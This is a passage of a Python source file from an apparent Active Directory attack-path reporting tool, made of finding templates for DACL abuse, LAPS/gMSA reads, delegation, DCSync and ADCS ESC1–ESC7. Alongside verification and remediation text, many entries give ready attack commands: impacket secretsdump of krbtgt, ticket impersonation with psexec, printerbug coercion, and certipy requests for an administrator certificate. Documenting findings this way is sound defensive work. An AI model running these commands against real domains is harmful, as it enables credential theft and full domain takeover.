            "ownership is seized, the attacker can rewrite the DACL at will, "
            "effectively granting full control over the object."
        ),
        "manual": (
            "# Take ownership of {target}, then rewrite its DACL to full control:\n"
            "impacket-owneredit -action write -new-owner {source} -target {target} "
            "<domain>/{source}:<pass> -dc-ip <dc_ip>\n"
            "impacket-dacledit -action write -rights FullControl -principal {source} "
            "-target {target} <domain>/{source}:<pass> -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm {source} can take ownership of {target} (WriteOwner):\n"
            "$dn = (Get-ADObject -LDAPFilter '(sAMAccountName={target})')"
            ".DistinguishedName\n"
            "(Get-Acl \"AD:$dn\").Access |\n"
            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
            "$_.ActiveDirectoryRights -match 'WriteOwner' }"
        ),
        "verify_linux": (
            "Read the target's security descriptor and confirm {source} has "
            "WriteOwner (read-only):\n"
            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor --resolve-sd\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
        ),
        "remediation": (
            "Remove the WriteOwner permission from {source} on {target}.",
            "Re-own the object to its intended administrative group (e.g. Domain Admins).",
        ),
    },
    "forcechangepassword": {
        "short": "ForceChangePassword: {source} can reset the password of {target} without knowing the old one.",
        "long": (
            "The User-Force-Change-Password extended right lets {source} set a new "
            "password on {target} without knowing the current password. The "
            "attacker resets the password and authenticates as {target} directly, "
            "completely taking over the account."
        ),
        "manual": (
            "# Reset {target}'s password without knowing the current one:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "set password {target} 'Newpass123!'\n"
            "#   nxc equivalent:\n"
            "nxc smb <dc_ip> -u {source} -p <pass> -M change-password "
            "-o USER={target} NEWPASS='Newpass123!'"
        ),
        "verify_windows": (
            "Confirm the finding by reading {target}'s ACL for the "
            "User-Force-Change-Password extended right "
            "(rightsGuid 00299570-246d-11d0-a768-00aa006e0529) granted to "
            "{source}. A matching ACE means the reset right is real and no "
            "password is changed by this check:\n"
            "dsacls \"<target DN>\"   # look for 'CONTROL ACCESS ... Reset "
            "Password' granted to {source}\n"
            "# Or, with the RSAT ActiveDirectory module:\n"
            "(Get-Acl \"AD:\\<target DN>\").Access |\n"
            "  Where-Object { $_.ObjectType -eq "
            "'00299570-246d-11d0-a768-00aa006e0529' -and "
            "$_.IdentityReference -match '{source}' }"
        ),
        "verify_linux": (
            "Read {target}'s DACL for the User-Force-Change-Password ACE "
            "(no password change performed):\n"
            "nxc ldap {dc_ip} -u <user> -p <pass> -M daclread "
            "-o TARGET={target} ACTION=read\n"
            "#   (or) bloodyAD --host {dc_ip} -d <domain> -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"
        ),
        "remediation": (
            "Remove the User-Force-Change-Password extended right from {source} on {target}.",
            "Review delegated password-reset rights. They should be granted only to helpdesk / tier-appropriate personnel.",
        ),
    },
    "addmember": {
        "short": "AddMember: {source} can add itself to {target}, inheriting all of the group's privileges.",
        "long": (
            "AddMember on the {target} group lets {source} add arbitrary principals "
            "(including itself) as members. Any privilege granted to {target}, "
            "often through nested group chains, is inherited immediately by the "
            "attacker."
        ),
        "manual": (
            "# Add {source} to the {target} group over LDAP:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "add groupMember {target} {source}\n"
            "#   nxc equivalent:\n"
            "nxc ldap <dc_ip> -u {source} -p <pass> -M add-member "
            "-o GROUP={target} USER={source}"
        ),
        "remediation": (
            "Remove the AddMember extended right from {source} on {target}.",
            "Audit recent group membership changes via Event ID 4728/4732/4756.",
        ),
    },
    "addself": {
        "short": "AddSelf: {source} can join the {target} group directly.",
        "long": (
            "AddSelf lets {source} add itself (but not others) to the {target} "
            "group. After self-insertion, {source} inherits every privilege held "
            "by {target}, often a fast path to tier-0 via nested group chains."
        ),
        "manual": (
            "# Join the {target} group directly:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "add groupMember {target} {source}"
        ),
        "remediation": (
            "Remove the AddSelf extended right from {source} on {target}.",
        ),
    },
    "readlapspassword": {
        "short": "ReadLAPSPassword: {source} can read the local administrator password of {target} from AD.",
        "long": (
            "The ReadLAPSPassword edge means {source} has the Control Access right "
            "on the ms-Mcs-AdmPwd (or ms-LAPS-Password) attribute of {target}. "
            "{source} simply queries the attribute via LDAP to retrieve the local "
            "Administrator password in cleartext and pivots to {target}."
        ),
        "manual": (
            "# Read the LAPS local-admin password over LDAP:\n"
            "nxc ldap <dc_ip> -u {source} -p <pass> -M laps\n"
            "#   or query the attribute directly:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "get object {target} --attr ms-Mcs-AdmPwd"
        ),
        "remediation": (
            "Remove the Control Access ACE on ms-Mcs-AdmPwd / ms-LAPS-Password from {source} on {target}.",
            "Audit LDAP reads of ms-LAPS-Password via Event ID 4662 with the LAPS GUID.",
        ),
    },
    "readgmsapassword": {
        "short": "ReadGMSAPassword: {source} can retrieve the managed password of gMSA {target}.",
        "long": (
            "ReadGMSAPassword lets {source} read the msDS-ManagedPassword attribute "
            "of the group-Managed Service Account {target}, yielding the current "
            "password blob. {source} then derives the NT hash and impersonates "
            "{target} directly."
        ),
        "manual": (
            "# Retrieve the gMSA managed password and derive the NT hash:\n"
            "nxc ldap <dc_ip> -u {source} -p <pass> --gmsa\n"
            "#   or:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u {source} -p <pass> "
            "get object {target} --attr msDS-ManagedPassword"
        ),
        "remediation": (
            "Remove {source} from the msDS-GroupMSAMembership of {target}.",
            "Minimize the gMSA password-retrieval principals to the service hosts that actually need them.",
        ),
    },
    "allowedtodelegate": {
        "short": "Constrained Delegation: {source} can impersonate any user (including Domain Admins) to {target}.",
        "long": (
            "{source} is configured for Kerberos constrained delegation to "
            "services on {target} (msDS-AllowedToDelegateTo). An attacker who "
            "controls {source} can request tickets as any user in the domain "
            "(including tier-0 admins) to services on {target}, fully compromising "
            "it."
        ),
        "manual": (
            "# S4U2self+S4U2proxy: impersonate administrator to a service on {target}:\n"
            "impacket-getST -spn cifs/{target} -impersonate administrator "
            "-dc-ip <dc_ip> <domain>/{source}:<pass>\n"
            "# Use the ticket:\n"
            "KRB5CCNAME=administrator@cifs_{target}.ccache impacket-psexec -k -no-pass {target}"
        ),
        "remediation": (
            "Remove services from msDS-AllowedToDelegateTo on {source}, or replace with Resource-Based Constrained Delegation.",
            "Add sensitive accounts to the Protected Users group or flag them as 'Account is sensitive and cannot be delegated'.",
        ),
    },
    "allowedtoact": {
        "short": "Resource-Based Constrained Delegation: {source} can impersonate any user to {target}.",
        "long": (
            "Resource-Based Constrained Delegation (RBCD) on {target} lists "
            "{source} in msDS-AllowedToActOnBehalfOfOtherIdentity. An attacker "
            "with control of {source} can request S4U2Self + S4U2Proxy tickets "
            "to impersonate any user (including Domain Admins) to {target}, "
            "fully compromising the host."
        ),
        "remediation": (
            "Clear msDS-AllowedToActOnBehalfOfOtherIdentity on {target} (or prune the offending entry).",
            "Audit writes to msDS-AllowedToActOnBehalfOfOtherIdentity (Event 5136) as high-severity.",
        ),
    },
    "addkeycredentiallink": {
        "short": "Shadow Credentials: {source} can attach a certificate-backed key to {target} and authenticate as it via PKINIT.",
        "long": (
            "AddKeyCredentialLink lets {source} write a new "
            "msDS-KeyCredentialLink entry on {target}. {source} then authenticates "
            "as {target} via PKINIT using the attacker-controlled certificate, "
            "obtaining a TGT and the NT hash of {target} without touching the "
            "password."
        ),
        "remediation": (
            "Remove the Write rights on msDS-KeyCredentialLink from {source} on {target}.",
            "Deploy the KeyCredentialLink auditing rule and alert on Event ID 5136 with attribute msDS-KeyCredentialLink.",
        ),
    },
    "dcsync": {
        "short": "DCSync: {source} can replicate secrets from the domain and extract the krbtgt hash.",
        "long": (
            "{source} holds the Replicating Directory Changes and Replicating "
            "Directory Changes All extended rights on the domain, meaning it can "
            "pull password hashes for any account via the DRSUAPI protocol "
            "(DCSync). Extracting the krbtgt hash yields persistent golden-ticket "
            "capability and full domain compromise."
        ),
        "manual": (
            "# Replicate the krbtgt hash (and any account) via DRSUAPI:\n"
            "impacket-secretsdump <domain>/{source}:<pass>@<dc_ip> -just-dc-user krbtgt\n"
            "#   nxc equivalent (dumps NTDS via DRSUAPI):\n"
            "nxc smb <dc_ip> -u {source} -p <pass> --ntds"
        ),
        "verify_windows": (
            "Confirm {source} holds the two replication rights on the domain head "
            "that make DCSync possible (GUIDs 1131f6aa- and 1131f6ad-):\n"
            "$dn = (Get-ADDomain).DistinguishedName\n"
            "(Get-Acl \"AD:$dn\").Access |\n"
            "  Where-Object { $_.IdentityReference -like '*{source}*' -and "
            "$_.ObjectType -in "
            "'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',"
            "'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' } |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType"
        ),
        "verify_linux": (
            "Read the domain object's DACL and confirm {source} has the "
            "Get-Changes / Get-Changes-All rights (read-only):\n"
            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
            "get object <domain-dn> --attr nTSecurityDescriptor --resolve-sd\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
        ),
        "remediation": (
            "Remove DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights from {source} on the domain.",
            "Limit these rights to DCs and approved replication service accounts only.",
            "Alert on DCSync via Event ID 4662 with the replication GUIDs from non-DC sources.",
        ),
    },
    "memberof": {
        "short": "Group membership: {source} is a member of {target} and inherits its privileges.",
        "long": (
            "{source} is a direct or nested member of {target}. All privileges "
            "held by {target}, including any onward attack-path edges, are "
            "inherited by {source}."
        ),
        "remediation": (
            "Remove {source} from {target} if the membership is not strictly required.",
            "Audit group membership periodically and enforce tiering boundaries.",
        ),
    },
    "adcsesc1": {
        "short": "ADCS ESC1: {source} can enroll in misconfigured certificate template {template} and impersonate any domain user.",
        "long": (
            "ADCS ESC1: the certificate template {template} allows {source_type} "
            "{source} to request certificates where the subject alternative name "
            "(SAN) is supplied by the requester. By specifying a privileged user "
            "(e.g. Domain Admin) in the SAN, the attacker obtains a certificate "
            "that authenticates as that user via PKINIT, fully compromising "
            "{target}."
        ),
        "manual": (
            "# Request a cert for a privileged user by supplying the SAN:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> \\\n"
            "  -ca <ca_name> -template {template} -upn administrator@<domain>\n"
            "# Authenticate with the issued cert to recover a TGT / NT hash:\n"
            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm template {template} is ESC1-vulnerable: it authorizes client "
            "authentication AND lets the enrollee supply the subject (SAN). The "
            "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT bit is 0x1 in msPKI-Certificate-Name-"
            "Flag:\n"
            "certutil -v -template {template} |\n"
            "  Select-String -Pattern 'ENROLLEE_SUPPLIES_SUBJECT', "
            "'Client Authentication', 'msPKI-Certificate-Name-Flag'"
        ),
        "verify_linux": (
            "Enumerate ADCS and confirm {template} is flagged vulnerable (read-only "
            "collection, no request issued):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Disable 'Enrollee supplies subject' on template {template}, or require manager approval for enrollment.",
            "Restrict enrollment permissions on {template} to authorized identities only.",
            "Apply the KB5014754 enforcement mode on the CA to block weak SAN mapping.",
        ),
    },
    "unconstraineddelegation": {
        "short": "Unconstrained Delegation: {source} can capture the TGT of any user that authenticates to it.",
        "long": (
            "{source} is marked TRUSTED_FOR_DELEGATION (unconstrained delegation). "
            "Any user that authenticates to {source}, including Domain Admins "
            "coerced via the Printer Bug / PetitPotam, deposits a forwardable "
            "TGT in {source}'s LSASS. The attacker dumps the TGT and pivots as "
            "that user to {target}."
        ),
        "manual": (
            "# On the compromised {source}, monitor for and capture arriving TGTs:\n"
            "impacket-krbrelayx -t ldap://<dc_ip> --victim {target}\n"
            "# Coerce a privileged account (e.g. a DC) to authenticate to {source}:\n"
            "impacket-printerbug <domain>/{source}:<pass>@<target_dc> <source_ip>"
        ),
        "remediation": (
            "Remove TRUSTED_FOR_DELEGATION from {source} unless strictly required; prefer constrained or resource-based delegation.",
            "Add tier-0 accounts to Protected Users or flag 'Account is sensitive and cannot be delegated'.",
        ),
    },
    "mssql_linked_server_lateral": {
        "short": (
            "Linked server from {source} lets a login on {source} run "
            "Transact-SQL on {target} under the linked-server login mapping."
        ),
        "long": (
            "A SQL Server linked server is configured from {source} to {target}, "
            "so a login authenticated to {source} can run Transact-SQL statements "
            "on {target} through the linked-server login mapping. The mapping runs "
            "those statements on {target} as {execution_identity} — so the "
            "effective operator on {target} is that account, not the user who "
            "reached {source}. Where that account is privileged on {target}, this "
            "provides a lateral-movement path onto {target}, and where outbound "
            "remote procedure calls are enabled it extends to native command "
            "execution on the remote host. The capability is configured and "
            "reachable but has not yet been exercised."
        ),
        "remediation": (
            "Audit the linked servers configured on {source} and remove any that "
            "are no longer required.",
            "Where a linked server is needed, map its login to a dedicated "
            "low-privilege account rather than a shared or administrative login, "
            "and avoid impersonating the caller's security context.",
            "Disable outbound remote procedure calls (RPC Out) on the linked "
            "server unless a business process depends on it.",
        ),
    },
    "xp_cmdshell": {
        "short": (
            "Sysadmin on the SQL Server hosted by {target} allows running "
            "operating-system commands on {target} as the SQL Server service "
            "account — {xp_cmdshell_plan}."
        ),
        "long": (
            "The SQL Server instance on {target} can execute operating-system "
            "commands when a session holds sysadmin. Having reached sysadmin on "
            "that instance, an attacker runs commands on {target} as "
            "{execution_identity} — a full host code-execution capability. In "
            "this path, {xp_cmdshell_plan}. When the sysadmin session was "
            "obtained through a linked-server login mapping, that account is the "
            "effective operator on {target} rather than the originating user."
        ),
        "remediation": (
            "Disable operating-system command execution on the instance: "
            "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE.",
            "Restrict sysadmin membership to the minimum set of accounts and run "
            "the SQL Server service under a low-privilege account.",
            "For linked servers, map the remote login to a least-privilege "
            "account rather than a sysadmin login.",
        ),
    },
    "adcsesc2": {
        "short": (
            "ADCS ESC2: {source} can enroll in certificate template {template}, "
            "which grants the Any Purpose EKU (or no EKU at all), so the issued "
            "certificate can be used to authenticate as any user."
        ),
        "long": (
            "ADCS ESC2 abuses a certificate template whose extended key usage is "
            "either the Any Purpose OID (2.5.29.37.0) or empty. A certificate "
            "with no usage restriction can be presented for client authentication, "
            "so {source_type} {source} — who holds enrollment rights on {template} "
            "and faces no manager approval and no enrollment-agent signature "
            "requirement — can request a certificate and then use it to log in as "
            "another identity. Unlike ESC1 the subject is not supplied by the "
            "requester; the escalation instead depends on how the certificate is "
            "later mapped to an account (for example paired with a weak "
            "certificate-to-account mapping), which lets the attacker pivot toward "
            "{target}."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the template is ESC2-vulnerable:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Request a certificate from the Any-Purpose template, then "
            "authenticate with it:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "certipy auth -pfx {source}.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm {template} grants the Any Purpose EKU (or no EKU) and lets a "
            "low-privileged principal enroll without manager approval:\n"
            "certutil -v -template {template} |\n"
            "  Select-String -Pattern 'Any Purpose', 'Extended Key Usage', "
            "'msPKI-Enrollment-Flag', 'msPKI-RA-Signature'\n"
            "# List the enrollment ACL on the template object:\n"
            "Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,"
            "$((Get-ADRootDSE).configurationNamingContext)\" -Properties nTSecurityDescriptor"
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm {template} is flagged ESC2 "
            "(no request issued):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Remove the Any Purpose EKU from {template} and assign only the "
            "specific extended key usages the template legitimately needs; a "
            "template used for authentication should carry a restricted EKU set, "
            "never Any Purpose or an empty EKU list.",
            "Require CA manager approval (set the CT_FLAG_PEND_ALL_REQUESTS "
            "enrollment flag) so a certificate is never issued automatically from "
            "this template.",
            "Restrict enrollment permissions on {template} to only the identities "
            "that must request it, and remove enrollment rights from broad groups "
            "such as Domain Users and Authenticated Users.",
            "Apply the KB5014754 strong certificate mapping enforcement on domain "
            "controllers so a certificate cannot be silently mapped to a "
            "higher-privileged account.",
        ),
    },
    "adcsesc3": {
        "short": (
            "ADCS ESC3: {source} can enroll in the enrollment-agent template "
            "{template}, obtain a Certificate Request Agent certificate, and then "
            "request certificates on behalf of any other user."
        ),
        "long": (
            "ADCS ESC3 abuses a certificate template that carries the Certificate "
            "Request Agent EKU (1.3.6.1.4.1.311.20.2.1). The attack has two halves. "
            "First, {source_type} {source} enrolls in the agent template — it has "
            "enrollment rights, no manager approval, and no enrollment-agent "
            "signature requirement — and receives an enrollment-agent certificate. "
            "Second, the attacker uses that agent certificate to co-sign a request "
            "on a second template that permits enrollment-on-behalf-of, minting a "
            "client-authentication certificate for a privileged target. "
            "Authenticating with that certificate via PKINIT then impersonates the "
            "target and compromises {target}."
        ),
        "manual": (
            "# Enumerate and confirm the enrollment-agent template is vulnerable:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# 1) Get an enrollment-agent certificate from the agent template:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template}\n"
            "# 2) Use the agent cert to request a cert AS a privileged user, then auth:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template User -pfx {source}.pfx -on-behalf-of "
            "'<domain>\\administrator'\n"
            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm {template} grants the Certificate Request Agent EKU and is "
            "enrollable without approval:\n"
            "certutil -v -template {template} |\n"
            "  Select-String -Pattern 'Certificate Request Agent', "
            "'1.3.6.1.4.1.311.20.2.1', 'msPKI-Enrollment-Flag', "
            "'msPKI-RA-Signature'\n"
            "# Check which templates accept an enrollment-agent co-signature "
            "(msPKI-RA-Application-Policies references the agent EKU):\n"
            "Get-ADObject -SearchBase \"CN=Certificate Templates,CN=Public Key "
            "Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)\" "
            "-LDAPFilter '(objectClass=pKICertificateTemplate)' -Properties "
            "msPKI-RA-Application-Policies"
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm the agent template is flagged "
            "ESC3 (no certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
        ),
        "remediation": (
            "Restrict enrollment on the enrollment-agent template {template} to a "
            "small, explicitly approved set of certificate-management operators; "
            "remove enrollment rights from Domain Users and Authenticated Users.",
            "Require CA manager approval on {template} so an enrollment-agent "
            "certificate is never issued automatically.",
            "On the CA, configure enrollment-agent restrictions (Restricted "
            "Enrollment Agents on the Enrollment Agents tab in the CA properties) "
            "so an agent certificate can only enroll for a defined set of "
            "templates and target principals.",
            "Audit every template that accepts an enrollment-agent signature and "
            "remove the on-behalf-of capability where it is not required.",
        ),
    },
    "adcsesc4": {
        "short": (
            "ADCS ESC4: {source} holds write access over certificate template "
            "{template}, so it can rewrite the template's configuration into an "
            "ESC1-style misconfiguration and then enroll to impersonate a "
            "privileged user."
        ),
        "long": (
            "ADCS ESC4 is a control-plane weakness: {source_type} {source} holds a "
            "write-equivalent right (GenericAll, GenericWrite, WriteDacl, "
            "WriteOwner, or Owns) over the certificate template object {template}. "
            "Any of these lets the attacker modify the template's attributes — for "
            "example enabling ENROLLEE_SUPPLIES_SUBJECT, adding a client "
            "authentication EKU, granting itself enrollment rights, and clearing "
            "the manager-approval flag — which turns the template into the ESC1 "
            "condition. The attacker then enrolls, supplies a privileged subject, "
            "and authenticates with the issued certificate to compromise {target}. "
            "Write access on the template alone is sufficient; no pre-existing "
            "template flag is required."
        ),
        "manual": (
            "# Confirm the write-access finding on the template:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Reconfigure the template into ESC1 (enrollee-supplies-subject + "
            "client auth), then restore it afterward:\n"
            "certipy template -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-template {template} -write-default-configuration\n"
            "# Then enroll supplying a privileged SAN and authenticate:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template} -upn administrator@<domain>\n"
            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "List the ACL on {template} and confirm a non-privileged principal "
            "holds a write-equivalent right (GenericAll / GenericWrite / WriteDacl "
            "/ WriteOwner):\n"
            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
            "$tmpl = Get-ADObject -LDAPFilter '(cn={template})' -SearchBase "
            "\"CN=Certificate Templates,CN=Public Key Services,CN=Services,$cfg\"\n"
            "(Get-Acl \"AD:$($tmpl.DistinguishedName)\").Access |\n"
            "  Where-Object { $_.ActiveDirectoryRights -match "
            "'GenericAll|GenericWrite|WriteDacl|WriteOwner' } |\n"
            "  Format-Table IdentityReference, ActiveDirectoryRights"
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm {template} is flagged ESC4 with "
            "the write principal listed (no template modified):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/access-controls"
        ),
        "remediation": (
            "Remove the excessive write rights on {template} — using dsacls or "
            "Set-Acl on the template object, revoke GenericAll / GenericWrite / "
            "WriteDacl / WriteOwner from any non-Tier-0 principal so only PKI "
            "administrators can modify it.",
            "Set the template owner to a Tier-0 PKI administration group rather "
            "than an ordinary user or an over-broad group.",
            "After removing the rights, inspect {template} for any ESC1-style "
            "changes the attacker may already have applied (enrollee-supplies-"
            "subject, added client-auth EKU, relaxed approval) and restore the "
            "intended secure configuration.",
            "Audit the ACLs of every certificate template and PKI container with "
            "Get-Acl / dsacls and treat template write access as a Tier-0 privilege.",
        ),
    },
    "adcsesc5": {
        "short": (
            "ADCS ESC5: {source} holds write access over a PKI infrastructure "
            "object ({target}), letting it tamper with the CA trust configuration "
            "and forge or trust attacker-controlled certificates."
        ),
        "long": (
            "ADCS ESC5 covers write-level control (GenericAll, GenericWrite, "
            "WriteDacl, WriteOwner, or Owns) over the high-value PKI objects that "
            "underpin certificate trust: the NTAuthStore (which lists the CAs "
            "trusted for domain client authentication), the Root CA and AIA CA "
            "objects, and the Enterprise CA object itself. {source_type} {source} "
            "with such a right on {target} can, for example, publish an "
            "attacker-controlled CA into NTAuth so that certificates it issues are "
            "trusted for logon, or otherwise reconfigure the CA to mint "
            "authentication certificates for privileged identities. Because these "
            "objects govern the whole PKI trust chain, compromising one is "
            "equivalent to controlling certificate-based authentication across the "
            "domain."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the write-on-PKI-object finding:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# With write on NTAuth, publish an attacker CA cert so its certs are "
            "trusted for logon (then remove it afterward):\n"
            "certutil -dspublish -f attacker_ca.crt NTAuthCA"
        ),
        "verify_windows": (
            "List the ACL on the PKI object and confirm a non-Tier-0 principal "
            "holds write access. For the NTAuth store:\n"
            "$cfg = (Get-ADRootDSE).configurationNamingContext\n"
            "(Get-Acl \"AD:CN=NTAuthCertificates,CN=Public Key Services,"
            "CN=Services,$cfg\").Access |\n"
            "  Where-Object { $_.ActiveDirectoryRights -match "
            "'GenericAll|GenericWrite|WriteDacl|WriteOwner' } |\n"
            "  Format-Table IdentityReference, ActiveDirectoryRights\n"
            "# List the CAs currently trusted for authentication:\n"
            "certutil -viewstore -enterprise NTAuth"
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; confirm the PKI object write finding "
            "(nothing published):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/access-controls"
        ),
        "remediation": (
            "Restrict the ACL on the affected PKI object ({target}) so only Tier-0 "
            "PKI administrators hold write access; use dsacls / Set-Acl to revoke "
            "GenericAll / GenericWrite / WriteDacl / WriteOwner from every other "
            "principal.",
            "Review the NTAuth store with certutil -viewstore -enterprise NTAuth "
            "and remove any CA certificate that should not be trusted for domain "
            "authentication.",
            "Set the owner of each PKI container (NTAuthStore, Root CA, AIA, "
            "Enterprise CA) to a Tier-0 group and treat these objects as part of "
            "the identity control plane.",
            "Enable auditing on the PKI containers so any future change to their "
            "ACL or contents is logged and alerted on.",
        ),
    },
    "adcsesc6": {
        "short": (
            "ADCS ESC6: the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, so "
            "{source} can request a certificate from an authentication template "
            "and inject an arbitrary subject alternative name to impersonate any "
            "user."
        ),
        "long": (
            "ADCS ESC6 is a CA-wide misconfiguration: the certification authority "
            "has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in its policy flags, which "
            "lets a requester specify an arbitrary subject alternative name (SAN) "
            "as a request attribute regardless of the template's settings. That "
            "makes ESC6 effectively an ESC1 that applies to EVERY authentication "
            "template the CA issues, not just a specific misconfigured one. "
            "{source_type} {source}, holding enrollment rights on any client "
            "authentication template with no manager approval, requests a "
            "certificate while supplying a privileged UPN in the SAN attribute, "
            "then authenticates with it via PKINIT to compromise {target}."
        ),
        "manual": (
            "# Enumerate ADCS; ESC6 is a CA-level flag reported by the tool:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# Request a cert from an auth template, injecting a privileged SAN, "
            "then authenticate:\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template {template} -upn administrator@<domain>\n"
            "certipy auth -pfx administrator.pfx -dc-ip <dc_ip>"
        ),
        "verify_windows": (
            "Confirm the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set in its policy "
            "EditFlags (run on the CA server or against it):\n"
            "certutil -config '<ca_host>\\<ca_name>' -getreg "
            "policy\\EditFlags |\n"
            "  Select-String -Pattern 'EDITF_ATTRIBUTESUBJECTALTNAME2'\n"
            "# The presence of that flag means any authenticated enrollee can "
            "supply an arbitrary SAN."
        ),
        "verify_linux": (
            "Read-only ADCS enumeration; the CA EDITF flag is reported in the CA "
            "section (no certificate requested):\n"
            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
            "-vulnerable -stdout\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
        ),
        "remediation": (
            "Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA and restart "
            "the certificate service: run certutil -config '<ca_host>\\<ca_name>' "
            "-setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2, then "
            "Restart-Service certsvc.",
            "Confirm the flag is cleared afterward with certutil -getreg "
            "policy\\EditFlags and validate that new requests can no longer supply "
            "an arbitrary SAN.",
            "Enforce strong certificate mapping on domain controllers as part of "
            "the KB5014754 rollout so a mis-mapped certificate is rejected even if "
            "one is issued.",
            "Review certificates already issued while the flag was active and "
            "revoke any that carry an unexpected subject alternative name.",
        ),
    },
    "adcsesc7": {
        "short": (
            "ADCS ESC7: {source} holds CA management rights (ManageCA / "
            "ManageCertificates) over the Enterprise CA {target}, letting it "
            "reconfigure the CA or approve its own request to obtain a privileged "
            "certificate."
        ),
        "long": (
            "ADCS ESC7 covers a principal with CA administrative rights on the "
            "Enterprise CA object. {source_type} {source} holds ManageCA and/or "
            "ManageCertificates over {target}. With ManageCA the attacker can "
            "change CA policy — for example enabling EDITF_ATTRIBUTESUBJECTALTNAME2 "
            "(turning the whole CA into ESC6) or re-adding a vulnerable template. "
            "With ManageCertificates (certificate manager / officer) the attacker "
            "can approve a request that was left pending, so it can submit a "
            "request for a privileged identity on an approval-gated template and "
            "then approve it itself. Either path yields an authentication "
            "certificate for a privileged account and compromises the domain."
        ),
        "manual": (
            "# Enumerate ADCS and confirm the CA-rights finding:\n"
            "certipy find -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-vulnerable -stdout\n"
            "# With ManageCA, enable the SAN policy flag (ESC7->ESC6), request a "
            "cert supplying a privileged SAN, then revert:\n"
            "certipy ca -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -enable-template SubCA\n"
            "certipy req -u {source}@<domain> -p <pass> -dc-ip <dc_ip> "
            "-ca <ca_name> -template SubCA -upn administrator@<domain>"
        ),
        "verify_windows": (
            "List the CA security permissions and confirm a non-Tier-0 principal "
            "holds Manage CA or Issue and Manage Certificates:\n"
            "certutil -config '<ca_host>\\<ca_name>' -getreg CA\\Security |\n"
            "  Select-String -Pattern 'Allow'\n"
